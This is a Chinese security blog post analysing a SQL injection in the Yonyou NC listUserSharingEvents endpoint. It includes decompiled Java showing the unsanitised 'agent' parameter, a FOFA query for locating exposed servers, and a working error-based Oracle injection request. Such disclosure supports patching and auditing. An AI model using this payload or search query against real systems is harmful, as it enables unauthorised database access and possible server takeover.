---
title: "用友NC listUserSharingEvents SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html
asset_dir: assets/用友nc-listusersharingevents-sql注入漏洞
---

# 用友NC listUserSharingEvents SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/9 08:28
* 2072浏览
* [4评论](#comment)
* 34分钟阅读

深入探索

sql

SQL

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

⽤友NC listUserSharingEvents 接⼝处存在[SQL注⼊漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

SQL注入检测工具

# 影响版本

nc65

# fofa语法

> `app="⽤友-UFIDA-NC"`

# 漏洞分析

看下 `listUserSharingEvents` 的业务逻辑实现

深入探索

网络安全会议

Web安全课程

编码转换工具

```
@Action
    public void listUserSharingEvents() throws BusinessException {
        String sch_startdate = this.getRequest().getParameter("sch_sd");
        String sch_enddate = this.getRequest().getParameter("sch_ed");
        String agent = this.getRequest().getParameter("agent");
        Map<String, String[]> sharingUsersMap = this.getDataOfUserSharingEvents(sch_startdate, sch_enddate, agent);
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version='1.0' encoding='UTF-8' ?>");
        sb.append("<share>");
        Iterator<Map.Entry<String, String[]>> iter = sharingUsersMap.entrySet().iterator();
        String[] tmp = null;

        while(iter.hasNext()) {
            Map.Entry<String, String[]> ent = (Map.Entry)iter.next();
            tmp = (String[])ent.getValue();
            sb.append("<user><name><![CDATA[").append(tmp[0]).append("]]></name><value><![CDATA[").append((String)ent.getKey()).append("]]></value><color><![CDATA[").append(tmp[2]).append("]]></color><stat><![CDATA[").append(tmp[1]).append("]]></stat></user>");
        }

        sb.append("</share>");
        CommonUtils.outputClientStreamWithGzip(this.getResponse(), "text/xml", sb.toString());
    }
```

深入探索

软件

漏洞修复方案

编程语言教程

`agent` 带入 `getDataOfUserSharingEvents` 方法

```
private Map<String, String[]> getDataOfUserSharingEvents(String startdate, String enddate, String agent) throws BusinessException {
        String pk_user = StringUtils.isNotEmpty(agent) ? agent : (String)CommonUtils.getCurrentPkPerson();
        ICpUserQry cpuserQuery = (ICpUserQry)NCLocator.getInstance().lookup(ICpUserQry.class);
        ISchedulerCacheQueryService schedulerCacheQueryService = (ISchedulerCacheQueryService)NCLocator.getInstance().lookup(ISchedulerCacheQueryService.class);
        String whereSql = this.getWhereSqlOfUserPksOfSharedEvent(pk_user, startdate, enddate);
        CpUserVO[] cpusers = cpuserQuery.getUserByWhere("cuserid in(" + whereSql + ")");
```

`agent` ==> `pk_user` ==> `getWhereSqlOfUserPksOfSharedEvent`

```
private String getWhereSqlOfUserPksOfSharedEvent(String pk_current_user, String start_date, String end_date) {
        String scopeSetWhereSql = "";

        try {
            scopeSetWhereSql = ScopeSetUtil.getScopeSetWhereSql(pk_current_user, "oacoscheduler", "fk_share", true, true, true, true);
        } catch (LfwBusinessException e) {
            Logger.error(e.getMessage());
        }

        String sql = "select distinct a.pk_user from oaco_schedulerevent a  where a.pk_user <> '%s' and a.pk_event in %s";
        sql = sql + " and ('%s' between a.recurstartdate and a.recurenddate or '%s' between a.recurstartdate and a.recurenddate or a.recurstartdate between '%s' and '%s') ";
        sql = String.format(sql, pk_current_user, scopeSetWhereSql, start_date, end_date, start_date, end_date);
        return sql;
    }
```

可以看到直接拼接 `pk_current_user` 到sql语句中，然后拼接到 `cuserid in(` 语句后，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

默认这个接口的响应如下，也符合上面漏洞分析里对应的代码部分

代码安全审计

[![用友NC listUserSharingEvents SQL注入漏洞](images/img-001-aabfc074fe25.webp)](https://image.mrxn.net/33b99db471084cebb8ddd87769d7cbc0.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

```
GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=6')+AND+1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
Host: nc.mrxn.net
```

通过报错[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，成功报出数据库版本信息

漏洞预警服务

[![用友NC listUserSharingEvents SQL注入漏洞](images/img-002-a1a186868377.webp)](https://image.mrxn.net/eacfe57ba007452fa8af0a45fb2ce7d2.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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